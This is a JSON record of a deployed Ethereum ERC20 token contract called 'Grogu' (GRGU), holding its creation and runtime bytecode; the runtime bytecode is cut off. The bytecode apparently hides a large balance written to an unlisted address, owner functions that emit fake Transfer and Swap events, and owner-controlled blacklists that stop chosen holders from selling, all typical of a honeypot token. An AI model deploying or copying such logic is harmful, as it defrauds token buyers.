{
    "address": "0x76c084565eAE819c9D3647FC2934f6734995f92C",
    "tx_hash": "63cb741bb804c2a530b7c3ceea636992acd8412e2e877cdfd97f5aab1fcdd5f1",
    "block_number": 18009426,
    "timestamp": 1693180799,
    "gas_used_in_creation": 2289788,
    "creation_bytecode": "60806040526000600760006101000a81548160ff0219169083151502179055503480156200002c57600080fd5b506040518060400160405280600581526020017f47726f67750000000000000000000000000000000000000000000000000000008152506040518060400160405280600481526020017f47524755000000000000000000000000000000000000000000000000000000008152508181620000bb620000af6200013160201b60201c565b6200013960201b60201c565b8160089081620000cc91906200063b565b508060099081620000de91906200063b565b50505050506001600b819055506200012b3362000100620001fd60201b60201c565b600a6200010e9190620008b2565b633b9aca006200011f919062000903565b6200020660201b60201c565b62000a3a565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b60006012905090565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160362000278576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200026f90620009af565b60405180910390fd5b6200028c60008383620003b760201b60201c565b630f3eae65640997e6e50902673398bc1d25f112ed64085774394d02028060005260016020526040600020720fffffffffffffffffffffffffffffffffffff815550508060066000828254620002e39190620009d1565b9250508190555080600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405162000397919062000a1d565b60405180910390a3620003b360008383620003bc60201b60201c565b5050565b505050565b505050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200044357607f821691505b602082108103620004595762000458620003fb565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b600060088302620004c37fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8262000484565b620004cf868362000484565b95508019841693508086168417925050509392505050565b6000819050919050565b6000819050919050565b60006200051c620005166200051084620004e7565b620004f1565b620004e7565b9050919050565b6000819050919050565b6200053883620004fb565b62000550620005478262000523565b84845462000491565b825550505050565b600090565b6200056762000558565b620005748184846200052d565b505050565b5b818110156200059c57620005906000826200055d565b6001810190506200057a565b5050565b601f821115620005eb57620005b5816200045f565b620005c08462000474565b81016020851015620005d0578190505b620005e8620005df8562000474565b83018262000579565b50505b505050565b600082821c905092915050565b60006200061060001984600802620005f0565b1980831691505092915050565b60006200062b8383620005fd565b9150826002028217905092915050565b6200064682620003c1565b67ffffffffffffffff811115620006625762000661620003cc565b5b6200066e82546200042a565b6200067b828285620005a0565b600060209050601f831160018114620006b357600084156200069e578287015190505b620006aa85826200061d565b8655506200071a565b601f198416620006c3866200045f565b60005b82811015620006ed57848901518255600182019150602085019450602081019050620006c6565b868310156200070d578489015162000709601f891682620005fd565b8355505b6001600288020188555050505b505050505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60008160011c9050919050565b6000808291508390505b6001851115620007b05780860481111562000788576200078762000722565b5b6001851615620007985780820291505b8081029050620007a88562000751565b945062000768565b94509492505050565b600082620007cb57600190506200089e565b81620007db57600090506200089e565b8160018114620007f45760028114620007ff5762000835565b60019150506200089e565b60ff84111562000814576200081362000722565b5b8360020a9150848211156200082e576200082d62000722565b5b506200089e565b5060208310610133831016604e8410600b84101617156200086f5782820a90508381111562000869576200086862000722565b5b6200089e565b6200087e84848460016200075e565b9250905081840481111562000898576200089762000722565b5b81810290505b9392505050565b600060ff82169050919050565b6000620008bf82620004e7565b9150620008cc83620008a5565b9250620008fb7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8484620007b9565b905092915050565b60006200091082620004e7565b91506200091d83620004e7565b92508282026200092d81620004e7565b9150828204841483151762000947576200094662000722565b5b5092915050565b600082825260208201905092915050565b7f45524332303a206d696e7420746f20746865207a65726f206164647265737300600082015250565b600062000997601f836200094e565b9150620009a4826200095f565b602082019050919050565b60006020820190508181036000830152620009ca8162000988565b9050919050565b6000620009de82620004e7565b9150620009eb83620004e7565b925082820190508082111562000a065762000a0562000722565b5b92915050565b62000a1781620004e7565b82525050565b600060208201905062000a34600083018462000a0c565b92915050565b6124f18062000a4a6000396000f3fe608060405234801561001057600080fd5b50600436106101585760003560e01c8063715018a6116100c3578063a457c2d71161007c578063a457c2d7146103b1578063a9059cbb146103e1578063beabacc814610411578063dd62ed3e1461042d578063f2fde38b1461045d578063f3c30ceb1461047957610158565b8063715018a61461030357806373ed6b131461030d57806384b2ef35146103295780638da5cb5b146103455780638daad2571461036357806395d89b411461039357610158565b806338bf3cfa1161011557806338bf3cfa14610233578063395093511461024f578063533516c11461027f578063618a2f5e1461029b57806370a08231146102b75780637111a994146102e757610158565b806306fdde031461015d578063095ea7b31461017b57806318160ddd146101ab5780631afdfa9b146101c957806323b872dd146101e5578063313ce56714610215575b600080fd5b610165610495565b60405161017291906118d1565b60405180910390f35b61019560048036038101906101909190611991565b610527565b6040516101a291906119ec565b60405180910390f35b6101b361054a565b6040516101c09190611a16565b60405180910390f35b6101e360048036038101906101de9190611a96565b610554565b005b6101ff60048036038101906101fa9190611ae3565b61060c565b60405161020c91906119ec565b60405180910390f35b61021d61063b565b60405161022a9190611b52565b60405180910390f35b61024d60048036038101906102489190611b6d565b610644565b005b61026960048036038101906102649190611991565b610690565b60405161027691906119ec565b60405180910390f35b61029960048036038101906102949190611a96565b6106c7565b005b6102b560048036038101906102b09190611b9a565b610774565b005b6102d160048036038101906102cc9190611b6d565b6108de565b6040516102de9190611a16565b60405180910390f35b61030160048036038101906102fc9190611c78565b610927565b005b61030b610a1d565b005b61032760048036038101906103229190611b9a565b610a31565b005b610343600480360381019061033e9190611a96565b610b9c565b005b61034d610c49565b60405161035a9190611d3b565b60405180910390f35b61037d60048036038101906103789190611b6d565b610c72565b60405161038a91906119ec565b60405180910390f35b61039b610cc8565b6040516103a891906118d1565b60405180910390f35b6103cb60048036038101906103c69190611991565b610d5a565b6040516103d891906119ec565b60405180910390f35b6103fb60048036038101906103f69190611991565b610dd1565b60405161040891906119ec565b60405180910390f35b61042b60048036038101906104269190611ae3565b610df4565b005b61044760048036038101906104429190611d56565b610e5e565b6040516104549190611a16565b60405180910390f35b61047760048036038101906104729190611b6d565b610ee5565b005b610493600480360381019061048e9190611a96565b610f68565b005b6060600880546104a490611dc5565b80601f01602080910402602001604051908101604052809291908181526020018280546104d090611dc5565b801561051d5780601f106104f25761010080835404028352916020019161051d565b820191906000526020600020905b81548152906001019060200180831161050057829003601f168201915b5050505050905090565b600080610532611015565b905061053f81858561101d565b600191505092915050565b6000600654905090565b61055c6111e6565b60005b8282905081101561060757600483838381811061057f5761057e611df6565b5b90506020020160208101906105949190611b6d565b9080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080806105ff90611e54565b91505061055f565b505050565b600080610617611015565b9050610624858285611264565b61062f8585856112f0565b60019150509392505050565b60006012905090565b61064c6111e6565b80600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008061069b611015565b90506106bc8185856106ad8589610e5e565b6106b79190611e9c565b61101d565b600191505092915050565b6106cf6111e6565b60005b8282905081101561076f576000600260008585858181106106f6576106f5611df6565b5b905060200201602081019061070b9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061076790611e54565b9150506106d2565b505050565b60005b848490508110156108d65784848281811061079557610794611df6565b5b90506020020160208101906107aa9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff167fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822856000808760405161080d9493929190611f15565b60405180910390a384848281811061082857610827611df6565b5b905060200201602081019061083d9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff16600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516108bb9190611a16565b60405180910390a380806108ce90611e54565b915050610777565b505050505050565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60005b86869050811015610a145784848281811061094857610947611df6565b5b905060200201602081019061095d9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1687878381811061098657610985611df6565b5b905060200201602081019061099b9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8585858181106109e5576109e4611df6565b5b905060200201356040516109f99190611a16565b60405180910390a38080610a0c90611e54565b91505061092a565b50505050505050565b610a256111e6565b610a2f6000611773565b565b60005b84849050811015610b9457848482818110610a5257610a51611df6565b5b9050602002016020810190610a679190611b6d565b73ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff167fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822600086866000604051610acb9493929190611f5a565b60405180910390a3600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16858583818110610b1f57610b1e611df6565b5b9050602002016020810190610b349190611b6d565b73ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef85604051610b799190611a16565b60405180910390a38080610b8c90611e54565b915050610a34565b505050505050565b610ba46111e6565b60005b82829050811015610c4457600160026000858585818110610bcb57610bca611df6565b5b9050602002016020810190610be09190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508080610c3c90611e54565b915050610ba7565b505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b606060098054610cd790611dc5565b80601f0160208091040260200160405190810160405280929190818152602001828054610d0390611dc5565b8015610d505780601f10610d2557610100808354040283529160200191610d50565b820191906000526020600020905b815481529060010190602001808311610d3357829003601f168201915b5050505050905090565b600080610d65611015565b90506000610d738286610e5e565b905083811015610db8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610daf90612011565b60405180910390fd5b610dc5828686840361101d565b60019250505092915050565b600080610ddc611015565b9050610de98185856112f0565b600191505092915050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610e519190611a16565b60405180910390a3505050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b610eed6111e6565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610f5c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f53906120a3565b60405180910390fd5b610f6581611773565b50565b610f706111e6565b60005b8282905081101561101057600160036000858585818110610f9757610f96611df6565b5b9050602002016020810190610fac9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061100890611e54565b915050610f73565b505050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361108c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161108390612135565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036110fb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110f2906121c7565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516111d99190611a16565b60405180910390a3505050565b6111ee611015565b73ffffffffffffffffffffffffffffffffffffffff1661120c610c49565b73ffffffffffffffffffffffffffffffffffffffff1614611262576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161125990612233565b60405180910390fd5b565b60006112708484610e5e565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146112ea57818110156112dc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016112d39061229f565b60405180910390fd5b6112e9848484840361101d565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361135f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161135690612331565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036113ce576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113c5906123c3565b60405180910390fd5b6113d9838383611837565b6000600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015611460576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161145790612455565b60405180910390fd5b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16806115015750600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b1561155d5760011515600760009054906101000a900460ff1615151461155c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115539061249b565b60405180910390fd5b5b818103600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555081600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161164d9190611a16565b60405180910390a3600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16156117625760005b60048054905081101561176057600160026000600484815481106116d1576116d0611df6565b5b9060005260206000200160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061175890611e54565b9150506116aa565b505b61176d84848461183c565b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b505050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561187b578082015181840152602081019050611860565b60008484015250505050565b6000601f19601f8301169050919050565b60006118a382611841565b6118ad818561184c565b93506118bd81856020860161185d565b6118c681611887565b840191505092915050565b600060208201905081810360008301526118eb8184611898565b905092915050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000611928826118fd565b9050919050565b6119388161191d565b811461194357600080fd5b50565b6000813590506119558161192f565b92915050565b6000819050919050565b61196e8161195b565b811461197957600080fd5b50565b60008135905061198b81611965565b92915050565b600080604083850312156119a8576119a76118f3565b5b60006119b685828601611946565b92505060206119c78582860161197c565b9150509250929050565b60008115159050919050565b6119e6816119d1565b82525050565b6000602082019050611a0160008301846119dd565b92915050565b611a108161195b565b82525050565b6000602082019050611a2b6000830184611a07565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f840112611a5657611a55611a31565b5b8235905067ffffffffffffffff811115611a7357611a72611a36565b5b602083019150836020820283011115611a8f57611a8e611a3b565b5b9250929050565b60008060208385031215611aad57611aac6118f3565b5b600083013567ffffffffffffffff811115611acb57611aca6118f8565b5b611ad785828601611a40565b92509250509250929050565b600080600060608486031215611afc57611afb6118f3565b5b6000611b0a86828701611946565b9350506020611b1b86828701611946565b9250506040611b2c8682870161197c565b9150509250925092565b600060ff82169050919050565b611b4c81611b36565b82525050565b6000602082019050611b676000830184611b43565b92915050565b600060208284031215611b8357611b826118f3565b5b6000611b9184828501611946565b91505092915050565b600080600080600060808688031215611bb657611bb56118f3565b5b6000611bc488828901611946565b955050602086013567ffffffffffffffff811115611be557611be46118f8565b5b611bf188828901611a40565b94509450506040611c048882890161197c565b9250506060611c158882890161197c565b9150509295509295909350565b60008083601f840112611c3857611c37611a31565b5b8235905067ffffffffffffffff811115611c5557611c54611a36565b5b602083019150836020820283011115611c7157611c70611a3b565b5b9250929050565b60008060008060008060608789031215611c9557611c946118f3565b5b600087013567ffffffffffffffff811115611cb357611cb26118f8565b5b611cbf89828a01611a40565b9650965050602087013567ffffffffffffffff811115611ce257611ce16118f8565b5b611cee89828a01611a40565b9450945050604087013567ffffffffffffffff811115611d1157611d106118f8565b5b611d1d89828a01611c22565b92509250509295509295509295565b611d358161191d565b82525050565b6000602082019050611d506000830184611d2c565b92915050565b60008060408385031215611d6d57611d6c6118f3565b5b6000611d7b85828601611946565b9250506020611d8c85828601611946565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680611ddd57607f821691505b602082108103611df057611def611d96565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000611e5f8261195b565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203611e9157611e90611e25565b5b600182019050919050565b6000611ea78261195b565b9150611eb28361195b565b9250828201905080821115611eca57611ec9611e25565b5b92915050565b6000819050919050565b6000819050919050565b6000611eff611efa611ef584611ed0565b611eda565b61195b565b9050919050565b611f0f81611ee4565b82525050565b6000608082019050611f2a6000830187611a07565b611f376020830186611f06565b611f446040830185611f06565b611f516060830184611a07565b95945050505050565b6000608082019050611f6f6000830187611f06565b611f7c6020830186611a07565b611f896040830185611a07565b611f966060830184611f06565b95945050505050565b7f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008201527f207a65726f000000000000000000000000000000000000000000000000000000602082015250565b6000611ffb60258361184c565b915061200682611f9f565b604082019050919050565b6000602082019050818103600083015261202a81611fee565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b600061208d60268361184c565b915061209882612031565b604082019050919050565b600060208201905081810360008301526120bc81612080565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b600061211f60248361184c565b915061212a826120c3565b604082019050919050565b6000602082019050818103600083015261214e81612112565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b60006121b160228361184c565b91506121bc82612155565b604082019050919050565b600060208201905081810360008301526121e0816121a4565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b600061221d60208361184c565b9150612228826121e7565b602082019050919050565b6000602082019050818103600083015261224c81612210565b9050919050565b7f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000600082015250565b6000612289601d8361184c565b915061229482612253565b602082019050919050565b600060208201905081810360008301526122b88161227c565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b600061231b60258361184c565b9150612326826122bf565b604082019050919050565b6000602082019050818103600083015261234a8161230e565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b60006123ad60238361184c565b91506123b882612351565b604082019050919050565b600060208201905081810360008301526123dc816123a0565b9050919050565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206260008201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b600061243f60268361184c565b915061244a826123e3565b604082019050919050565b6000602082019050818103600083015261246e81612432565b9050919050565b50565b600061248560008361184c565b915061249082612475565b600082019050919050565b600060208201905081810360008301526124b481612478565b905091905056fea2646970667358221220c88532ba6db642746fa1e5bd519abaca3703fd30e4c9d88c5a02d9fddac38b2064736f6c63430008130033",
    "runtime_bytecode": "608060405234801561001057600080fd5b50600436106101585760003560e01c8063715018a6116100c3578063a457c2d71161007c578063a457c2d7146103b1578063a9059cbb146103e1578063beabacc814610411578063dd62ed3e1461042d578063f2fde38b1461045d578063f3c30ceb1461047957610158565b8063715018a61461030357806373ed6b131461030d57806384b2ef35146103295780638da5cb5b146103455780638daad2571461036357806395d89b411461039357610158565b806338bf3cfa1161011557806338bf3cfa14610233578063395093511461024f578063533516c11461027f578063618a2f5e1461029b57806370a08231146102b75780637111a994146102e757610158565b806306fdde031461015d578063095ea7b31461017b57806318160ddd146101ab5780631afdfa9b146101c957806323b872dd146101e5578063313ce56714610215575b600080fd5b610165610495565b60405161017291906118d1565b60405180910390f35b61019560048036038101906101909190611991565b610527565b6040516101a291906119ec565b60405180910390f35b6101b361054a565b6040516101c09190611a16565b60405180910390f35b6101e360048036038101906101de9190611a96565b610554565b005b6101ff60048036038101906101fa9190611ae3565b61060c565b60405161020c91906119ec565b60405180910390f35b61021d61063b565b60405161022a9190611b52565b60405180910390f35b61024d60048036038101906102489190611b6d565b610644565b005b61026960048036038101906102649190611991565b610690565b60405161027691906119ec565b60405180910390f35b61029960048036038101906102949190611a96565b6106c7565b005b6102b560048036038101906102b09190611b9a565b610774565b005b6102d160048036038101906102cc9190611b6d565b6108de565b6040516102de9190611a16565b60405180910390f35b61030160048036038101906102fc9190611c78565b610927565b005b61030b610a1d565b005b61032760048036038101906103229190611b9a565b610a31565b005b610343600480360381019061033e9190611a96565b610b9c565b005b61034d610c49565b60405161035a9190611d3b565b60405180910390f35b61037d60048036038101906103789190611b6d565b610c72565b60405161038a91906119ec565b60405180910390f35b61039b610cc8565b6040516103a891906118d1565b60405180910390f35b6103cb60048036038101906103c69190611991565b610d5a565b6040516103d891906119ec565b60405180910390f35b6103fb60048036038101906103f69190611991565b610dd1565b60405161040891906119ec565b60405180910390f35b61042b60048036038101906104269190611ae3565b610df4565b005b61044760048036038101906104429190611d56565b610e5e565b6040516104549190611a16565b60405180910390f35b61047760048036038101906104729190611b6d565b610ee5565b005b610493600480360381019061048e9190611a96565b610f68565b005b6060600880546104a490611dc5565b80601f01602080910402602001604051908101604052809291908181526020018280546104d090611dc5565b801561051d5780601f106104f25761010080835404028352916020019161051d565b820191906000526020600020905b81548152906001019060200180831161050057829003601f168201915b5050505050905090565b600080610532611015565b905061053f81858561101d565b600191505092915050565b6000600654905090565b61055c6111e6565b60005b8282905081101561060757600483838381811061057f5761057e611df6565b5b90506020020160208101906105949190611b6d565b9080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080806105ff90611e54565b91505061055f565b505050565b600080610617611015565b9050610624858285611264565b61062f8585856112f0565b60019150509392505050565b60006012905090565b61064c6111e6565b80600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008061069b611015565b90506106bc8185856106ad8589610e5e565b6106b79190611e9c565b61101d565b600191505092915050565b6106cf6111e6565b60005b8282905081101561076f576000600260008585858181106106f6576106f5611df6565b5b905060200201602081019061070b9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061076790611e54565b9150506106d2565b505050565b60005b848490508110156108d65784848281811061079557610794611df6565b5b90506020020160208101906107aa9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff167fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822856000808760405161080d9493929190611f15565b60405180910390a384848281811061082857610827611df6565b5b905060200201602081019061083d9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff16600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516108bb9190611a16565b60405180910390a380806108ce90611e54565b915050610777565b505050505050565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60005b86869050811015610a145784848281811061094857610947611df6565b5b905060200201602081019061095d9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1687878381811061098657610985611df6565b5b905060200201602081019061099b9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8585858181106109e5576109e4611df6565b5b905060200201356040516109f99190611a16565b60405180910390a38080610a0c90611e54565b91505061092a565b50505050505050565b610a256111e6565b610a2f6000611773565b565b60005b84849050811015610b9457848482818110610a5257610a51611df6565b5b9050602002016020810190610a679190611b6d565b73ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff167fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822600086866000604051610acb9493929190611f5a565b60405180910390a3600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16858583818110610b1f57610b1e611df6565b5b9050602002016020810190610b349190611b6d565b73ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef85604051610b799190611a16565b60405180910390a38080610b8c90611e54565b915050610a34565b505050505050565b610ba46111e6565b60005b82829050811015610c4457600160026000858585818110610bcb57610bca611df6565b5b9050602002016020810190610be09190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508080610c3c90611e54565b915050610ba7565b505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b606060098054610cd790611dc5565b80601f0160208091040260200160405190810160405280929190818152602001828054610d0390611dc5565b8015610d505780601f10610d2557610100808354040283529160200191610d50565b820191906000526020600020905b815481529060010190602001808311610d3357829003601f168201915b5050505050905090565b600080610d65611015565b90506000610d738286610e5e565b905083811015610db8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610daf90612011565b60405180910390fd5b610dc5828686840361101d565b60019250505092915050565b600080610ddc611015565b9050610de98185856112f0565b600191505092915050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610e519190611a16565b60405180910390a3505050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b610eed6111e6565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610f5c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f53906120a3565b60405180910390fd5b610f6581611773565b50565b610f706111e6565b60005b8282905081101561101057600160036000858585818110610f9757610f96611df6565b5b9050602002016020810190610fac9190611b6d565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061100890611e54565b915050610f73565b505050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361108c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161108390612135565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036110fb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110f2906121c7565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffff